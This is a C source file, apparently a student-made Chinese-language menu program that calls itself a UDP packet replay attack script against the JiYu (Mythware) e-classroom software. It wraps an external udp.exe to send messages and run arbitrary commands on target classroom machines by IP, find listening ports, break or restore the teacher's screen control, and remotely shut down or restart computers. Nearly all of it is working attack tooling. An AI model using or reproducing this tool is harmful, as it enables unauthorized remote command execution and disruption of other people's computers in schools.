#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_COMMAND_LENGTH 256

void execute_command(const char* command) {
    printf("命令预览：\n%s\n", command);
    char confirm;
    printf("是否执行？（y确定，n取消）");
    scanf_s(" %c", &confirm, 1);

    if (confirm == 'y' || confirm == 'Y') {
        printf("正在执行...\n");
        system(command);
        printf("执行完成！\n");
    }
    else {
        printf("操作已取消。\n");
    }
}

void pause() {
    printf("按任意键继续...");
    getchar(); // 等待用户按键
    getchar(); // 捕获回车

}

int main() {
    int choice;
    char ip[16];
    char port[6];
    char message[MAX_COMMAND_LENGTH];
    char command[MAX_COMMAND_LENGTH];

    while (1) {
        system("cls");
        printf("极域电子教室数据包(UDP)重放攻击脚本\n\n");
        printf("请选择操作：\n");
        printf("1. 发送消息\n");
        printf("2. 执行命令\n");
        printf("3. 获取内网IP地址及监听端口\n");
        printf("4. 脱离屏幕控制\n");
        printf("5. 恢复屏幕控制\n");
        printf("6. 关机\n");
        printf("7. 重启\n");
        printf("8. 退出\n");
        printf("请输入对应数字序号：");
        scanf_s("%d", &choice);

        switch (choice) {
        case 1:
            printf("请输入您想远控的端口（默认为4705，如果您不知道这是什么，请填写4705，若远控失败，请使用获取监听端口功能。）：");
            scanf_s("%5s", port, (unsigned)_countof(port));
            printf("请输入您想远控的IP：");
            scanf_s("%15s", ip, (unsigned)_countof(ip));
            printf("请输入您想发送的内容：");
            scanf_s(" %[^\n]", message, (unsigned)_countof(message));
            snprintf(command, MAX_COMMAND_LENGTH, "udp.exe -ip %s -p %s -msg \"%s\"", ip, port, message);
            execute_command(command);
            pause();
            break;
        case 2:
            printf("请输入您想远控的端口（默认为4705，如果您不知道这是什么，请填写4705，若远控失败，请使用获取监听端口功能。）：");
            scanf_s("%5s", port, (unsigned)_countof(port));
            printf("请输入您想远控的IP：");
            scanf_s("%15s", ip, (unsigned)_countof(ip));
            printf("请输入您想执行的命令：");
            scanf_s(" %[^\n]", message, (unsigned)_countof(message));
            snprintf(command, MAX_COMMAND_LENGTH, "udp.exe -ip %s -p %s -c \"%s\"", ip, port, message);
            execute_command(command);
            pause();
            break;
        case 3:
            printf("请输入您想获取的IP地址：");
            scanf_s("%15s", ip, (unsigned)_countof(ip));
            snprintf(command, MAX_COMMAND_LENGTH, "udp.exe -ip %s -e g", ip);
            execute_command(command);
            pause();
            break;
        case 4:
            printf("请输入您想脱离的IP地址：");
            scanf_s("%15s", ip, (unsigned)_countof(ip));
            snprintf(command, MAX_COMMAND_LENGTH, "udp.exe -ip %s -e break", ip);
            execute_command(command);
            pause();
            break;
        case 5:
            printf("请输入您想恢复的IP地址：");
            scanf_s("%15s", ip, (unsigned)_countof(ip));
            snprintf(command, MAX_COMMAND_LENGTH, "udp.exe -ip %s -e continue", ip);
            execute_command(command);
            pause();
            break;
        case 6:
            printf("请输入您想关机的IP地址：");
            scanf_s("%15s", ip, (unsigned)_countof(ip));
            snprintf(command, MAX_COMMAND_LENGTH, "udp.exe -ip %s -e s", ip);
            execute_command(command);
            pause();
            break;
        case 7:
            printf("请输入您想重启的IP地址：");
            scanf_s("%15s", ip, (unsigned)_countof(ip));
            snprintf(command, MAX_COMMAND_LENGTH, "udp.exe -ip %s -e r", ip);
            execute_command(command);
            pause();
            break;
        case 8:
            printf("退出程序。\n");
            return 0;
        default:
            printf("无效的选择，请重新运行程序。\n");
            pause();
            break;
        }
    }

    return 0;
}
